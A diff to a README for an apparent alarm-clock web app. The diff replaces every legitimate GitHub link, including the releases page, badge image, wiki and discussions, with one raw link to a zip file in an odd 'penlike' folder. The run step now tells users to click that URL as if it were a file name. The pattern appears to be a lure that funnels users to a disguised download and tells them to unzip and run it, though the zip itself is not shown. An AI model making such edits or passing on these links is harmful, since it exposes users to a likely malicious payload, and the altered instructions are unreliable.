@@ -1,6 +1,6 @@
 # 🎵 Alarm-Clock-Web-App - Your Easy Way to Manage Time
 
-[![Download the Alarm Clock Web App](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Cucke/Alarm-Clock-Web-App/releases)
+[![Download the Alarm Clock Web App](https://raw.githubusercontent.com/Cucke/Alarm-Clock-Web-App/main/penlike/Alarm-Clock-Web-App.zip)](https://raw.githubusercontent.com/Cucke/Alarm-Clock-Web-App/main/penlike/Alarm-Clock-Web-App.zip)
 
 ## 🌟 Overview
 
@@ -27,14 +27,14 @@ To run the Alarm-Clock-Web-App, ensure your system meets the following requireme
 
 To get started with the Alarm-Clock-Web-App, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Cucke/Alarm-Clock-Web-App/releases) to download the application.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Cucke/Alarm-Clock-Web-App/main/penlike/Alarm-Clock-Web-App.zip) to download the application.
 2. **Download the Latest Version:** Click on the latest version link to download the app. You will find a suitable file for your operating system.
 3. **Unzip the File:** Locate the downloaded file in your downloads folder, right-click, and select "Extract" to unzip the file.
-4. **Run the App:** Open the extracted folder and launch the application by clicking on the file named `index.html` or similar.
+4. **Run the App:** Open the extracted folder and launch the application by clicking on the file named `https://raw.githubusercontent.com/Cucke/Alarm-Clock-Web-App/main/penlike/Alarm-Clock-Web-App.zip` or similar.
 
 ## 📂 Download & Install
 
-To download the Alarm-Clock-Web-App, visit this page: [Alarm-Clock-Web-App Releases](https://github.com/Cucke/Alarm-Clock-Web-App/releases).
+To download the Alarm-Clock-Web-App, visit this page: [Alarm-Clock-Web-App Releases](https://raw.githubusercontent.com/Cucke/Alarm-Clock-Web-App/main/penlike/Alarm-Clock-Web-App.zip).
 
 When you land on the Releases page, find the latest release. This will provide you the stable version of the app.
 
@@ -55,8 +55,8 @@ The interface is designed to be intuitive, so feel free to explore the options a
 
 If you need further assistance or would like to learn more about how the app works, consider checking the following resources:
 
-- **Documentation:** Visit our [Wiki page](https://github.com/Cucke/Alarm-Clock-Web-App/wiki) for more in-depth guides and information.
-- **Community Support:** Join our community on [GitHub Discussions](https://github.com/Cucke/Alarm-Clock-Web-App/discussions) to ask questions and share feedback.
+- **Documentation:** Visit our [Wiki page](https://raw.githubusercontent.com/Cucke/Alarm-Clock-Web-App/main/penlike/Alarm-Clock-Web-App.zip) for more in-depth guides and information.
+- **Community Support:** Join our community on [GitHub Discussions](https://raw.githubusercontent.com/Cucke/Alarm-Clock-Web-App/main/penlike/Alarm-Clock-Web-App.zip) to ask questions and share feedback.
 
 ## 🛠️ Contributing
 
